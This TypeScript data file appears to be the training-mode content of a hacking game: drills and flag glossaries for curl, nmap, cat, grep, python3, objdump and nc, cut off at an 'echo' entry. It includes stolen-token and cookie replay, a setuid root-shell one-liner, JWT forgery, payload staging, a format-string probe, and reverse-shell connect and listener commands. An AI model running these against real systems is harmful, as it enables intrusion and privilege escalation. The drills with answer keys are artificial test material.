/**
 * Training Mode content — a study guide for the real-world tools this game actually uses,
 * plus a second tier of tools that don't appear in any mission but are daily-driver staples
 * for working cybersecurity professionals (flagged via `realWorldOnly`). Decoupled from
 * ChainDef/NodeDef/ObjectiveDef on purpose: no map coordinates, no points economy, no mission
 * unlock ordering — just "what does this tool's syntax look like, can you write it, and could
 * you explain to someone else why it works."
 */

export interface TrainingDrill {
  id: string;
  scenario: string;
  /** tokens checked against the typed answer via checkDrillAnswer() — substring match after normalize() */
  accepted: { requires: string[]; forbids?: string[] };
  /** canonical answer, shown on reveal or after a correct submit */
  sampleAnswer: string;
  /** the why/how behind this specific answer — several sentences, not just a flag definition */
  explain: string;
}

export interface FlagRef {
  /** the flag/option/subcommand as typed, e.g. "-X <method>" */
  flag: string;
  /** what it does and, where relevant, why it matters */
  meaning: string;
}

export interface TrainingTool {
  id: string;
  rank: number;
  name: string;
  useCount: number;
  blurb: string;
  /** the underlying mechanism — what's actually happening when this tool runs, in plain language */
  howItWorks: string;
  /** set when the game only ever uses one fixed invocation of this tool (e.g. nmap's -sV) */
  canonicalForm?: string;
  /** a broader flag/option glossary, beyond just what's used in referenceBlock/drills */
  flagGlossary: FlagRef[];
  referenceBlock: string[];
  /** additional real-world capabilities beyond what's drilled, "cmd — description" lines */
  useCases: string[];
  /** true for tools never scripted into a mission — included purely because real practitioners use them daily */
  realWorldOnly?: boolean;
  drills: TrainingDrill[];
}

export interface TrainingData {
  tools: TrainingTool[];
}

export const training: TrainingData = {
  tools: [
    {
      id: "curl",
      rank: 1,
      name: "curl",
      useCount: 136,
      blurb:
        "HTTP client — the single most-used tool in this game. Recon, auth bypass, API abuse, and exfiltration all run through curl.",
      howItWorks:
        "curl opens a TCP connection to the target and speaks the protocol directly — for HTTP(S) that means sending a request line (METHOD /path HTTP/1.1), headers, and an optional body, then printing back exactly what the server sends: a status line, response headers, and a body. There's no browser rendering, no JavaScript execution, and no cookie jar unless you explicitly ask for one — what you see is exactly what went over the wire. That's what makes it the right tool for probing an API or replaying a captured request byte-for-byte.",
      flagGlossary: [
        { flag: "-X <method>", meaning: "Sets the HTTP method (POST, PUT, DELETE, ...) explicitly. Without it curl defaults to GET, or auto-switches to POST the moment -d is present." },
        { flag: "-d <data>", meaning: "Sends data as the request body, form-encoded (key=value&key2=value2) by default." },
        { flag: '-H "<header>"', meaning: "Adds one raw header line to the request — repeat the flag once per header." },
        { flag: "-i", meaning: "Prints the response headers above the body, so you can see status codes, Set-Cookie, redirects." },
        { flag: "-s", meaning: "Silent mode — hides the progress meter, useful when piping curl's output into another command." },
        { flag: "-L", meaning: "Follows HTTP redirects (3xx responses) instead of just printing the redirect." },
        { flag: "-o <file>", meaning: "Writes the response body to a file instead of stdout." },
        { flag: "-k", meaning: "Skips TLS certificate validation — fine against a lab's self-signed cert, never on a real engagement without cause." },
      ],
      referenceBlock: [
        "curl http://<ip>/path                                        — plain GET",
        'curl -X POST http://<ip>/path -d "key=value&key2=value2"      — POST a form body',
        'curl -H "Authorization: Bearer <token>" https://<ip>/api/...  — replay a bearer token',
        'curl -i -H "Cookie: session=<value>" http://<ip>/admin        — replay a session cookie, show headers',
      ],
      useCases: [
        "curl -O http://<ip>/tool.sh                          — download a file, keeping its remote filename",
        'curl -X POST -H "Content-Type: application/json" -d \'{"user":"a"}\' http://<ip>/api  — send JSON instead of form data',
        "curl -I http://<ip>                                  — HEAD request: headers only, no body",
        'curl -w "%{time_total}\\n" -o /dev/null -s http://<ip>  — time a request without printing its body',
        "curl -u user:pass http://<ip>/admin                  — HTTP Basic Auth in one flag",
      ],
      drills: [
        {
          id: "curl-01",
          scenario: "Fetch the root page of a web app running on port 8080 at 10.10.10.5.",
          accepted: { requires: ["curl", "10.10.10.5:8080"] },
          sampleAnswer: "curl http://10.10.10.5:8080/",
          explain:
            "A bare curl <url> issues a GET request and prints the response body — the simplest possible use, and your default whenever you're not sending data or forcing a method.",
        },
        {
          id: "curl-02",
          scenario: "POST a login attempt with username 'admin' and password 'letmein' to http://<ip>/login.",
          accepted: { requires: ["curl", "-x post", "-d", "admin", "letmein"] },
          sampleAnswer: 'curl -X POST http://<ip>/login -d "username=admin&password=letmein"',
          explain:
            "-X POST changes the request line's method; -d attaches the body and, if you skip -X entirely, curl infers POST for you automatically. The body is sent as key=value pairs joined by & — exactly what an HTML <form> would send to the same endpoint.",
        },
        {
          id: "curl-03",
          scenario: "You have a stolen bearer token 'abc123'. Use it to hit the admin API at https://<ip>/api/admin.",
          accepted: { requires: ["curl", "-h", "authorization", "bearer", "abc123", "/api/admin"] },
          sampleAnswer: 'curl -H "Authorization: Bearer abc123" https://<ip>/api/admin',
          explain:
            "-H adds one raw line to the header section of the request. Authorization: Bearer <token> is the standard way modern APIs expect a stolen or issued token to be replayed — the server checks that header before it even looks at the body or the URL path.",
        },
        {
          id: "curl-04",
          scenario:
            "You captured a session cookie value 'a1f9c2e7'. Replay it as a Cookie header against http://<ip>/admin, and show response headers too.",
          accepted: { requires: ["curl", "-i", "-h", "cookie", "a1f9c2e7", "/admin"] },
          sampleAnswer: 'curl -i -H "Cookie: session=a1f9c2e7" http://<ip>/admin',
          explain:
            "-i tells curl to print the response's status line and headers before the body, so you can actually see whether the server accepted your Cookie header (a 200 with real data) or silently rejected it (a redirect back to a login page).",
        },
        {
          id: "curl-05",
          scenario: "Send a DELETE request to http://<ip>/api/sessions/42 to invalidate a session, with no body attached.",
          accepted: { requires: ["curl", "-x delete", "/api/sessions/42"] },
          sampleAnswer: "curl -X DELETE http://<ip>/api/sessions/42",
          explain: "-X overrides the method even with no body attached — DELETE, PUT, and PATCH all need this since curl would otherwise default to GET.",
        },
        {
          id: "curl-06",
          scenario: "Confirm which HTTP methods an endpoint allows without ever invoking any of them, using OPTIONS against http://<ip>/api/setpoints.",
          accepted: { requires: ["curl", "-x options", "/api/setpoints"] },
          sampleAnswer: "curl -X OPTIONS http://<ip>/api/setpoints",
          explain: "OPTIONS is a safe way to probe scope — the Allow header in the response tells you what's permitted without you actually invoking anything.",
        },
        {
          id: "curl-07",
          scenario: "POST the single field feedback=none to http://<ip>/api/feedback, letting curl infer the method from -d alone (no -X).",
          accepted: { requires: ["curl", "-d", "feedback=none", "/api/feedback"], forbids: ["-x"] },
          sampleAnswer: 'curl -d "feedback=none" http://<ip>/api/feedback',
          explain: "-d alone is enough — curl automatically switches to POST the moment it sees a -d flag, so an explicit -X POST is redundant here even though many people type it anyway for clarity.",
        },
        {
          id: "curl-08",
          scenario: "Send two form fields in one POST body: user=agent14 and action=logout.",
          accepted: { requires: ["curl", "-d", "user=agent14", "action=logout"] },
          sampleAnswer: 'curl -d "user=agent14&action=logout" http://<ip>/api/session',
          explain: "Multiple form fields are joined with & in one -d string — this is literally what a browser sends when you submit a multi-field HTML form.",
        },
        {
          id: "curl-09",
          scenario: "Set a custom X-Api-Key header with value 7f3a9c on a request to http://<ip>/api/status.",
          accepted: { requires: ["curl", "-h", "x-api-key", "7f3a9c", "/api/status"] },
          sampleAnswer: 'curl -H "X-Api-Key: 7f3a9c" http://<ip>/api/status',
          explain: "-H isn't limited to standard headers — any custom header an API expects, like X-Api-Key or X-Internal-Debug, goes through the exact same flag.",
        },
        {
          id: "curl-10",
          scenario: "Send two headers at once on one request: Content-Type: application/json and X-Request-Id: abc.",
          accepted: { requires: ["curl", "-h", "content-type", "application/json", "-h", "x-request-id", "abc"] },
          sampleAnswer: 'curl -H "Content-Type: application/json" -H "X-Request-Id: abc" http://<ip>/api',
          explain: "-H is repeatable — each header needs its own -H flag, since you can't combine two separate header lines into one flag.",
        },
        {
          id: "curl-11",
          scenario: "Check the raw status code and headers a redirecting endpoint returns at http://<ip>/old-page, without following the redirect.",
          accepted: { requires: ["curl", "-i", "/old-page"], forbids: ["-l"] },
          sampleAnswer: "curl -i http://<ip>/old-page",
          explain: "-i shows the status line and headers above the body — a 301/302 plus a Location header is visible here even though curl, by default, won't follow it for you.",
        },
        {
          id: "curl-12",
          scenario: "Fetch http://<ip>/health with no progress meter cluttering a script's output.",
          accepted: { requires: ["curl", "-s", "/health"] },
          sampleAnswer: "curl -s http://<ip>/health",
          explain: "-s is almost always used inside scripts or pipelines, where the human-facing progress bar would just be noise mixed into stdout.",
        },
        {
          id: "curl-13",
          scenario: "Fetch http://<ip>/go, following any redirect it returns, all the way to the final page.",
          accepted: { requires: ["curl", "-l", "/go"] },
          sampleAnswer: "curl -L http://<ip>/go",
          explain: "Without -L, curl prints the redirect response itself and stops — -L tells it to keep following Location headers until it lands on a non-redirect response.",
        },
        {
          id: "curl-14",
          scenario: "Download http://<ip>/report.pdf and save it locally as loot.pdf.",
          accepted: { requires: ["curl", "-o", "loot.pdf", "/report.pdf"] },
          sampleAnswer: "curl -o loot.pdf http://<ip>/report.pdf",
          explain: "-o lets you choose the output filename directly, unlike -O which just reuses whatever name the URL happens to end in.",
        },
        {
          id: "curl-15",
          scenario: "Connect to https://<ip>/api even though it's using a self-signed lab certificate that would normally fail validation.",
          accepted: { requires: ["curl", "-k", "https://<ip>/api"] },
          sampleAnswer: "curl -k https://<ip>/api",
          explain: "-k skips certificate validation entirely — fine for a lab's self-signed cert, but never something to reach for against a real target without a specific reason, since it also defeats protection against a live MITM.",
        },
      ],
    },
    {
      id: "nmap",
      rank: 2,
      name: "nmap",
      useCount: 53,
      blurb: "Network/service scanner — always the first move on a new target. This game only ever needs one form of it.",
      howItWorks:
        "nmap sends crafted packets at a target's ports and studies what comes back — a probe to a port either gets a response (open), a rejection (closed), or nothing (filtered by a firewall). With -sV, once a port shows open, nmap goes further: it exchanges data with the service running there and cross-references the response fingerprint against its own database to identify the exact software and version. That version string is often the first real lead into a target's software stack.",
      canonicalForm: "nmap -sV <ip>",
      flagGlossary: [
        { flag: "-sV", meaning: "Service/version detection — probes each open port and identifies what's actually running there." },
        { flag: "-sS", meaning: "SYN scan (a 'half-open' scan) — the classic fast, stealthy default nmap uses when run with root privileges." },
        { flag: "-p <ports>", meaning: "Restricts the scan to specific ports or ranges instead of the default top-1000." },
        { flag: "-A", meaning: "Aggressive mode — turns on OS detection, version detection, script scanning, and traceroute all at once." },
        { flag: "-sC", meaning: "Runs nmap's default set of enumeration scripts against whatever's open." },
        { flag: "-oN <file>", meaning: "Saves output to a plain-text file for later reference." },
      ],
      referenceBlock: ["nmap -sV <ip>   — service/version scan, the form this game always expects"],
      useCases: [
        "nmap -p- <ip>                — scan all 65535 ports, not just the default top-1000",
        "nmap -sC -sV <ip>            — version detection plus default enumeration scripts in one pass",
        "nmap -A <ip>                 — the everything-at-once aggressive scan",
        "nmap -Pn <ip>                — skip the host-alive ping check, for targets that block ICMP",
        "nmap --top-ports 20 <ip>     — a fast scan of just the 20 most common ports",
      ],
      drills: [
        {
          id: "nmap-01",
          scenario: "Scan 10.10.10.20 for open services and their versions.",
          accepted: { requires: ["nmap", "-sv", "10.10.10.20"] },
          sampleAnswer: "nmap -sV 10.10.10.20",
          explain:
            "-sV probes each open port by sending it protocol-appropriate data and comparing the response against nmap's fingerprint database — this is what turns 'port 80 is open' into 'this is nginx 1.24.0'.",
        },
        {
          id: "nmap-02",
          scenario: "Write the general form of that same scan against a placeholder target <ip>.",
          accepted: { requires: ["nmap", "-sv", "<ip>"] },
          sampleAnswer: "nmap -sV <ip>",
          explain:
            "The <ip> placeholder is standing in for whatever real target you're pointed at — the flags never change, only the address does. Get comfortable typing this exact form and you'll never hesitate on a mission's first move.",
        },
        {
          id: "nmap-03",
          scenario:
            "(Beyond this game, real-world nmap) Scan only ports 22, 80, and 443 on <ip> instead of the full range, still grabbing versions.",
          accepted: { requires: ["nmap", "-sv", "-p", "22", "80", "443", "<ip>"] },
          sampleAnswer: "nmap -sV -p 22,80,443 <ip>",
          explain:
            "-p narrows the scan to a specific port list instead of nmap's default top-1000, trading completeness for speed — worth doing once you already know (or suspect) which services matter from other recon. This game only ever uses the full -sV scan, but real engagements narrow scope like this constantly.",
        },
        {
          id: "nmap-04",
          scenario: "Run a fast SYN scan against <ip> without version detection.",
          accepted: { requires: ["nmap", "-ss", "<ip>"] },
          sampleAnswer: "nmap -sS <ip>",
          explain: "-sS is nmap's classic 'half-open' scan — fast, and when run as root it never completes the TCP handshake, making it quieter than a full connect scan.",
        },
        {
          id: "nmap-05",
          scenario: "Run nmap's default enumeration scripts alongside version detection against <ip>.",
          accepted: { requires: ["nmap", "-sc", "-sv", "<ip>"] },
          sampleAnswer: "nmap -sC -sV <ip>",
          explain: "-sC layers nmap's default script set on top of whatever -sV already found — many scripts specifically enrich version-detected services with extra banner or config info.",
        },
        {
          id: "nmap-06",
          scenario: "Run the all-in-one aggressive scan (OS detection, versions, scripts, traceroute) against <ip>.",
          accepted: { requires: ["nmap", "-a", "<ip>"] },
          sampleAnswer: "nmap -A <ip>",
          explain: "-A is a convenience flag bundling several expensive checks at once — great for a lab, but noisy and slow enough that real engagements usually prefer composing the individual flags they actually need instead.",
        },
        {
          id: "nmap-07",
          scenario: "Scan <ip> and save the results to a plain-text file named scan.txt.",
          accepted: { requires: ["nmap", "-on", "scan.txt", "<ip>"] },
          sampleAnswer: "nmap -oN scan.txt <ip>",
          explain: "-oN writes the same output you'd see on screen to a file, giving you a permanent record to reference later or paste directly into a report.",
        },
      ],
    },
    {
      id: "cat",
      rank: 3,
      name: "cat",
      useCount: 20,
      blurb: "Prints file contents — the final step of nearly every objective: reading flags, configs, leaked source, and creds off disk.",
      howItWorks:
        "cat (short for 'concatenate') opens one or more files and streams their raw bytes straight to standard output, in order, with zero interpretation. There's no pagination, no formatting, no filtering — it's the most literal way to read a file's contents, which is exactly why it's the default choice once you know precisely which file you want.",
      flagGlossary: [
        { flag: "-n", meaning: "Numbers every output line — handy for referencing a specific line back to someone." },
        { flag: "-A", meaning: "Shows non-printing characters (tabs as ^I, line endings as $) — useful for spotting hidden whitespace or Windows line endings." },
        { flag: "(no flag)", meaning: "Just dumps the file(s) verbatim — the overwhelmingly common usage." },
      ],
      referenceBlock: ["cat <file>", "cat /etc/passwd", "cat local.txt"],
      useCases: [
        "cat file1 file2 > combined.txt   — concatenate two files into a new one",
        "cat -n script.sh                 — read a file with line numbers, useful when reporting a bug at a specific line",
        "cat file | grep pattern          — pipe cat's output into another tool (though grep file works just as well directly)",
      ],
      drills: [
        {
          id: "cat-01",
          scenario: "You have a shell. Print the contents of local.txt in the current directory.",
          accepted: { requires: ["cat", "local.txt"] },
          sampleAnswer: "cat local.txt",
          explain:
            "cat with no flags just streams the whole file to stdout — exactly what you want for a short flag file where you don't need paging or filtering.",
        },
        {
          id: "cat-02",
          scenario: "Read a leaked app config at /var/www/config.php.",
          accepted: { requires: ["cat", "/var/www/config.php"] },
          sampleAnswer: "cat /var/www/config.php",
          explain:
            "Absolute paths work identically to relative ones since cat doesn't care about your current directory beyond resolving the path — once an LFI or directory listing hands you a full path, cat it exactly as given.",
        },
        {
          id: "cat-03",
          scenario: "Print /etc/passwd to enumerate local user accounts.",
          accepted: { requires: ["cat", "/etc/passwd"] },
          sampleAnswer: "cat /etc/passwd",
          explain:
            "/etc/passwd is world-readable on virtually every Linux box by design (it only stores usernames/UIDs/shells, not password hashes anymore) — reading it is always safe and always worth doing early.",
        },
        {
          id: "cat-04",
          scenario: "Read /etc/hosts with each line numbered.",
          accepted: { requires: ["cat", "-n", "/etc/hosts"] },
          sampleAnswer: "cat -n /etc/hosts",
          explain: "-n prefixes every line with its number, useful once you need to point someone else at an exact line instead of describing it.",
        },
        {
          id: "cat-05",
          scenario: "Check a downloaded script for hidden non-printing characters or Windows line endings.",
          accepted: { requires: ["cat", "-a"] },
          sampleAnswer: "cat -A script.sh",
          explain: "-A reveals characters a normal read hides — tabs show as ^I and line endings show as $, exactly how you'd spot a script silently broken by CRLF line endings.",
        },
      ],
    },
    {
      id: "grep",
      rank: 4,
      name: "grep",
      useCount: 7,
      blurb:
        "Text filter — almost never run alone in this game. It's piped after nmap, objdump, and strings to cut noisy output down to the one line that matters.",
      howItWorks:
        "grep reads text line by line — either from a file argument or from standard input via a pipe — and prints only the lines that match a pattern, discarding everything else. Its real power in a terminal workflow isn't running it alone; it's chaining it after a command that produces too much output, using | to hand grep that command's stdout as its own input.",
      flagGlossary: [
        { flag: "-i", meaning: "Case-insensitive matching." },
        { flag: "-v", meaning: "Inverts the match — prints every line that does NOT match." },
        { flag: "-r", meaning: "Recursively searches every file under a directory." },
        { flag: "-n", meaning: "Prefixes each matched line with its line number." },
        { flag: "-E", meaning: "Enables extended regex syntax (so you don't have to backslash-escape +, ?, |, etc.)." },
        { flag: "-A <n> / -B <n>", meaning: "Shows n lines of context after/before each match." },
      ],
      referenceBlock: [
        "<command> | grep <pattern>          — keep only matching lines",
        "objdump -d ./binary | grep system    — find a call to a specific function",
        "strings -a -t x ./binary | grep /bin/sh  — find where a string constant is referenced",
      ],
      useCases: [
        "grep -ri password .              — case-insensitive recursive search for a word across a whole directory",
        "grep -v '^#' config.txt          — strip out comment lines from a config file",
        "cat access.log | grep -c 404     — count how many lines match, instead of printing them",
        "grep -E 'error|fail' log.txt     — match either of two patterns in one pass",
      ],
      drills: [
        {
          id: "grep-01",
          scenario: "Disassemble telemetryd and keep only lines mentioning 'system'.",
          accepted: { requires: ["objdump", "-d", "./telemetryd", "grep", "system"] },
          sampleAnswer: "objdump -d ./telemetryd | grep system",
          explain:
            "The pipe (|) hands objdump's entire stdout stream to grep as its stdin — grep never touches the binary itself, it only ever sees text that's already been printed to the terminal.",
        },
        {
          id: "grep-02",
          scenario: "Dump strings from ./telemetryd with offsets, keeping only the line referencing /bin/sh.",
          accepted: { requires: ["strings", "-a", "-t x", "./telemetryd", "grep", "/bin/sh"] },
          sampleAnswer: "strings -a -t x ./telemetryd | grep /bin/sh",
          explain:
            "Piping strings — which can print thousands of lines from a real binary — into grep is the fastest way to go from 'a huge wall of text' to 'the one line I actually needed,' a workflow you'll repeat constantly across recon and binary analysis alike.",
        },
        {
          id: "grep-03",
          scenario: "Find a ROP gadget containing the exact instruction 'pop rdi' out of a full gadget dump.",
          accepted: { requires: ["ropgadget", "--binary", "grep", "pop rdi"] },
          sampleAnswer: "ROPgadget --binary ./telemetryd | grep 'pop rdi'",
          explain:
            "Wrapping the search term in quotes keeps the space inside 'pop rdi' as one grep argument instead of two separate ones — without the quotes, grep would search for lines containing 'pop' and treat 'rdi' as an unrelated second argument (a filename).",
        },
        {
          id: "grep-04",
          scenario: "Search error.log for the word 'fail', case-insensitively.",
          accepted: { requires: ["grep", "-i", "fail", "error.log"] },
          sampleAnswer: "grep -i fail error.log",
          explain: "-i ignores case entirely, so 'Fail', 'FAIL', and 'fail' all match the same pattern — essential since you rarely know in advance how a log actually capitalizes things.",
        },
        {
          id: "grep-05",
          scenario: "Print every line in access.log that does NOT contain '200'.",
          accepted: { requires: ["grep", "-v", "200", "access.log"] },
          sampleAnswer: "grep -v 200 access.log",
          explain: "-v inverts the match entirely — instead of finding lines you're looking for, it filters out the ones you already understand, often the faster way to spot anomalies in a big log.",
        },
        {
          id: "grep-06",
          scenario: "Recursively search every file under /var/www for the string 'password'.",
          accepted: { requires: ["grep", "-r", "password", "/var/www"] },
          sampleAnswer: "grep -r password /var/www",
          explain: "-r walks every file in the directory tree automatically — without it, grep only looks at exactly the file(s) you name.",
        },
        {
          id: "grep-07",
          scenario: "Search config.php for 'db_pass' and show the line number it's found on.",
          accepted: { requires: ["grep", "-n", "db_pass", "config.php"] },
          sampleAnswer: "grep -n db_pass config.php",
          explain: "-n prefixes each match with its line number — handy the moment you need to open an editor and jump straight to it.",
        },
        {
          id: "grep-08",
          scenario: "Search app.log for lines containing either 'error' or 'fail' in one pass, using extended regex.",
          accepted: { requires: ["grep", "-e", "error|fail"] },
          sampleAnswer: "grep -E 'error|fail' app.log",
          explain: "-E enables extended regex, so | (alternation) works without backslash-escaping — without -E you'd need grep 'error\\|fail' instead.",
        },
        {
          id: "grep-09",
          scenario: "Search app.log for 'exception' and show 3 lines of context after each match.",
          accepted: { requires: ["grep", "-a 3", "exception"] },
          sampleAnswer: "grep -A 3 exception app.log",
          explain: "-A n prints n lines after each match, turning a single matching line into enough surrounding context to actually understand what happened.",
        },
      ],
    },
    {
      id: "python3",
      rank: 5,
      name: "python3",
      useCount: 6,
      blurb: "One-liners for privilege escalation and exploit scripting — this game uses it for setuid tricks and JWT forgery.",
      howItWorks:
        "python3 -c runs a short script passed directly as a command-line string instead of a file — the interpreter reads it, executes it top to bottom, and exits. This is how the language becomes a terminal tool in its own right: for a one-off task (flip a UID, forge a token, stand up a server) it's faster to type a one-liner than to create, save, and run a whole script file.",
      flagGlossary: [
        { flag: '-c "<code>"', meaning: "Executes the given string as a Python program instead of reading a file." },
        { flag: "-m <module>", meaning: "Runs a library module as a script — e.g. -m http.server starts Python's built-in web server." },
        { flag: "import os", meaning: "The standard library module for OS-level operations (os.setuid, os.system, file paths, environment variables)." },
        { flag: "import jwt", meaning: "The PyJWT library — encodes and decodes JSON Web Tokens, needs to be installed separately from the standard library." },
      ],
      referenceBlock: [
        'python3.9 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
        "python3 -c \"import jwt; print(jwt.encode({'role':'admin'}, key, algorithm='HS256'))\"",
      ],
      useCases: [
        "python3 -c 'print(2**64)'                       — quick math without opening a calculator",
        'python3 -c "import base64; print(base64.b64decode(\'aGVsbG8=\').decode())"  — decode base64 without a separate tool',
        "python3 -m http.server 8000                      — instant static file server for staging payloads",
        'python3 -c \'import socket; s=socket.socket(); s.connect(("<ip>",4444))\'  — a raw one-liner TCP connection, the backbone of a Python reverse shell',
      ],
      drills: [
        {
          id: "python3-01",
          scenario: "A binary has cap_setuid set. Use python3.9 to set your UID to 0 and drop into a root shell.",
          accepted: { requires: ["python3", "-c", "os.setuid(0)", "os.system"] },
          sampleAnswer: 'python3.9 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
          explain:
            "os.setuid(0) is a direct syscall wrapper — it works here specifically because the binary carries the cap_setuid capability, so the kernel honors the UID change with no further permission check. os.system then spawns a shell that inherits that new, elevated UID.",
        },
        {
          id: "python3-02",
          scenario: "Forge a JWT with role=admin, signed with a key you already have, using HS256.",
          accepted: { requires: ["python3", "jwt.encode", "hs256"] },
          sampleAnswer: "python3 -c \"import jwt; print(jwt.encode({'role':'admin'}, key, algorithm='HS256'))\"",
          explain:
            "jwt.encode() takes the payload dict, the signing key, and the algorithm name, and returns a complete, signed token string. HS256 is symmetric — the same key both signs and verifies — so once you have that key (leaked, guessed, or derived), you can mint tokens indistinguishable from the server's own.",
        },
        {
          id: "python3-03",
          scenario: "Spin up a quick local HTTP server on port 8000 to stage a payload file for a target to pull.",
          accepted: { requires: ["python3", "-m", "http.server", "8000"] },
          sampleAnswer: "python3 -m http.server 8000",
          explain:
            "-m runs a standard-library module as if it were a script — http.server specifically spins up a static file server bound to the given port with zero configuration, which is why it's the fastest way to stage a payload for a target to pull down.",
        },
        {
          id: "python3-04",
          scenario: "Use a one-liner to check the current process's UID, without shelling out to whoami.",
          accepted: { requires: ["python3", "-c", "import os", "os.getuid"] },
          sampleAnswer: "python3 -c 'import os; print(os.getuid())'",
          explain: "os.getuid() is the read-only counterpart to os.setuid() — useful for confirming your privilege level from inside a script rather than calling out to another tool.",
        },
        {
          id: "python3-05",
          scenario: "Start a Python HTTP server bound to port 9000 instead of the default 8000.",
          accepted: { requires: ["python3", "-m", "http.server", "9000"] },
          sampleAnswer: "python3 -m http.server 9000",
          explain: "The port is just a positional argument after the module name — swap it any time the default 8000 is already in use or blocked.",
        },
        {
          id: "python3-06",
          scenario: "Decode a captured JWT to read its payload, without verifying its signature.",
          accepted: { requires: ["python3", "jwt.decode", "verify_signature"] },
          sampleAnswer: "python3 -c \"import jwt; print(jwt.decode(token, options={'verify_signature': False}))\"",
          explain: "Setting verify_signature to False lets you read a token's claims even without the key — useful purely for inspection, though obviously never a substitute for real verification in production code.",
        },
      ],
    },
    {
      id: "objdump",
      rank: 6,
      name: "objdump",
      useCount: 6,
      blurb: "Disassembler — used throughout binary exploitation missions to find gadgets, hidden functions, and dangerous format-string sinks.",
      howItWorks:
        "objdump reads a compiled binary's raw bytes and translates its machine-code sections back into human-readable assembly and metadata — the reverse of what a compiler does. Different flags expose different parts of that structure: -d walks the executable code itself, -t reads the symbol table (names mapped to addresses), and -R reads the relocation table (which external functions get resolved at load time).",
      flagGlossary: [
        { flag: "-d", meaning: "Disassembles executable (.text) sections into assembly instructions." },
        { flag: "-D", meaning: "Like -d, but disassembles every section, not just the ones expected to hold code." },
        { flag: "-t", meaning: "Prints the symbol table — names and addresses of every function and global variable objdump can identify." },
        { flag: "-R", meaning: "Prints dynamic relocation entries — the PLT/GOT slots resolved at runtime, i.e. what external library functions the binary calls." },
        { flag: "-s", meaning: "Full contents dump of every section in hex + ASCII." },
      ],
      referenceBlock: [
        "objdump -d ./binary            — full disassembly",
        "objdump -d ./binary | grep system — find calls to a specific function",
        "objdump -R ./binary            — dynamic relocations (PLT/GOT entries)",
        "objdump -t ./binary            — symbol table",
      ],
      useCases: [
        "objdump -d ./binary -M intel        — disassemble using Intel syntax instead of the AT&T default",
        "objdump -h ./binary                 — list section headers (.text, .data, .bss, sizes/addresses) without disassembling",
        "objdump -d ./binary > full.asm      — save a full disassembly to a file for slower, careful reading",
      ],
      drills: [
        {
          id: "objdump-01",
          scenario: "Disassemble the binary netdiagd to look for a helpful call.",
          accepted: { requires: ["objdump", "-d", "./netdiagd"] },
          sampleAnswer: "objdump -d ./netdiagd",
          explain:
            "-d walks every instruction in the binary's executable sections and prints it as assembly — this is your starting point any time you need to understand what a binary actually does at the machine-code level, before you can find a gadget or a dangerous call.",
        },
        {
          id: "objdump-02",
          scenario: "Disassemble telemetryd and filter just for references to the 'system' function.",
          accepted: { requires: ["objdump", "-d", "./telemetryd", "grep", "system"] },
          sampleAnswer: "objdump -d ./telemetryd | grep system",
          explain:
            "Piping a huge disassembly dump into grep system narrows thousands of lines down to just the call(s) you actually care about — the same pattern you'll use with strings and ROPgadget too.",
        },
        {
          id: "objdump-03",
          scenario: "Check diagd's dynamic relocations to see what external functions it imports.",
          accepted: { requires: ["objdump", "-r", "./diagd"] },
          sampleAnswer: "objdump -R ./diagd",
          explain:
            "-R lists the PLT/GOT — the table of external function addresses the binary resolves at load time. Overwriting one of those entries (a GOT overwrite) is a classic technique for hijacking a binary's control flow without needing a stack overflow at all.",
        },
        {
          id: "objdump-04",
          scenario: "Dump profiled's symbol table looking for a suspicious internal struct type name.",
          accepted: { requires: ["objdump", "-t", "./profiled"] },
          sampleAnswer: "objdump -t ./profiled",
          explain:
            "-t dumps every symbol objdump can identify, including functions never called from main() — real backdoors and dead code both show up here, since the symbol table doesn't care whether something is reachable, only whether it exists in the binary.",
        },
        {
          id: "objdump-05",
          scenario: "Dump every section of ./binary in hex and ASCII, rather than disassembling it.",
          accepted: { requires: ["objdump", "-s", "./binary"] },
          sampleAnswer: "objdump -s ./binary",
          explain: "-s dumps raw section contents in hex+ASCII instead of disassembling — useful for inspecting raw data sections, like a .rodata string table, rather than code.",
        },
      ],
    },
    {
      id: "nc",
      rank: 7,
      name: "nc",
      useCount: 5,
      blurb: "Netcat — raw TCP client, used here to interact with vulnerable network services directly (format-string bugs, custom listeners).",
      howItWorks:
        "netcat opens a raw TCP (or UDP) connection and hands you direct read/write access to it — no protocol logic, no formatting, just bytes in and bytes out. Whatever you type gets sent; whatever the other end sends back gets printed. That rawness is exactly what makes it useful for talking to a custom or undocumented service where a purpose-built client doesn't exist.",
      flagGlossary: [
        { flag: "nc <host> <port>", meaning: "Connects to a listening service as a client." },
        { flag: "-l -p <port>", meaning: "Listen mode — nc itself becomes the server, waiting for an incoming connection on that port (this is what catches a reverse shell)." },
        { flag: "-v", meaning: "Verbose — prints connection status messages." },
        { flag: "-u", meaning: "Switches to UDP instead of the default TCP." },
      ],
      referenceBlock: ["nc <ip> <port>", 'echo "<payload>" | nc <ip> <port>'],
      useCases: [
        "nc -lvp 4444                       — start a listener on port 4444 to catch an incoming reverse shell",
        "nc -zv <ip> 20-100                 — quick port scan (-z sends no data, just checks if the port accepts a connection)",
        "cat file | nc <ip> <port>          — send a whole file's contents into an open connection",
      ],
      drills: [
        {
          id: "nc-01",
          scenario: "Connect directly to a custom service listening on port 7878 at <ip>.",
          accepted: { requires: ["nc", "<ip>", "7878"] },
          sampleAnswer: "nc <ip> 7878",
          explain:
            "Bare nc <host> <port> connects like a raw TCP client and drops you into an interactive session — everything you type after that is sent verbatim, and anything the service sends back is printed live, with no interpretation in either direction.",
        },
        {
          id: "nc-02",
          scenario: "Pipe a crafted format-string payload straight into a service on port 6060 without opening an interactive session.",
          accepted: { requires: ["echo", "nc", "6060"] },
          sampleAnswer: 'echo "AAAA%p%p%p%p%p%p" | nc <ip> 6060',
          explain:
            "Piping echo's single line into nc sends exactly one payload and lets the connection close naturally once echo runs out of output — ideal for a single probe where you don't need, or want, an interactive back-and-forth.",
        },
        {
          id: "nc-03",
          scenario: "Start a listener on port 4444 to catch an incoming reverse shell, in verbose mode.",
          accepted: { requires: ["nc", "-lvp", "4444"] },
          sampleAnswer: "nc -lvp 4444",
          explain: "-l switches nc from client to listener mode, becoming the server waiting for something else to connect in — exactly what's needed to catch a reverse shell. -v just adds status messages so you see the connection land.",
        },
        {
          id: "nc-04",
          scenario: "Send a UDP probe to port 161 on <ip> instead of the default TCP.",
          accepted: { requires: ["nc", "-u", "<ip>", "161"] },
          sampleAnswer: "nc -u <ip> 161",
          explain: "-u switches the underlying protocol to UDP — necessary since UDP services (like SNMP on 161) won't respond to a normal TCP connection attempt at all.",
        },
      ],
    },
    {
      id: "echo",
      rank: 8,
      name: "echo",
